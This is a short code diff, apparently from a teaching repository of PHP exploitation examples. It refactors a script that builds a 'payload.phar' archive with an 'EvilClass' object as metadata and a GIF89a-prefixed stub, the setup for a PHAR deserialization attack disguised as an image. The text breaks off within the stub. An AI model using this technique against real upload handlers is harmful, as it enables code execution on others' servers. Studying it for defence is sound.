@@ -1,6 +1,5 @@
 <?php
-
-include '../phar/EvilClass.php';
+require '../vendor/autoload.php';
 
 $fileName = '../phar/payload.phar';
 
@@ -9,7 +8,7 @@ $fileName = '../phar/payload.phar';
 $phar = new Phar($fileName);
 
 $phar->buildFromDirectory('../phar/', '/\.php$/');
-$phar->setMetadata(new EvilClass());
+$phar->setMetadata(new \Examples\Example5\EvilClass());
 $phar->setStub('GIF89a<?php
 
 function __autoload($name) {
